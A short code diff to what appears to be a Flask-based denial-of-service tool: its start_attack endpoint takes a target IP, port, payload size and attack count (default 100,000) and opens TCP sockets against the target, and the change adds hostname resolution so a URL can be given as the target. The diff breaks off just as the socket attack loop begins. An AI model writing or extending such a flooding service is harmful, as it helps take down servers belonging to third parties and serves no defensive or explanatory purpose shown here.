@@ -2,6 +2,7 @@ from flask import Flask, jsonify, request
 import socket
 import random
 import os
+import re
 
 app = Flask(__name__)
 
@@ -12,6 +13,28 @@ def start_attack():
     num_attacks = data.get('attack_num', 100000)
     target_ip = data.get('ip', "0.0.0.0")
     target_port = data.get('port', 80)
+
+# Function to check if a string is a valid IP address
+    def is_valid_ip(ip):
+        parts = ip.split('.')
+        if len(parts) != 4:
+            return False
+        for part in parts:
+            if not part.isdigit() or not 0 <= int(part) <= 255:
+                return False
+        return True
+
+# If target_ip is not a valid IP address, try to resolve it as a URL
+    if not is_valid_ip(target_ip):
+    # Remove protocol prefix if present
+        target_url = re.sub(r'^(http|https|ftp|udp)://', '', target_ip)
+        target_ip = socket.gethostbyname(target_url)
+    
+    #data = request.get_json()
+    #num_bytes = data.get('payload', 1024)
+    #num_attacks = data.get('attack_num', 100000)
+    #target_ip = data.get('ip', "0.0.0.0")
+    #target_port = data.get('port', 80)
 
     def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
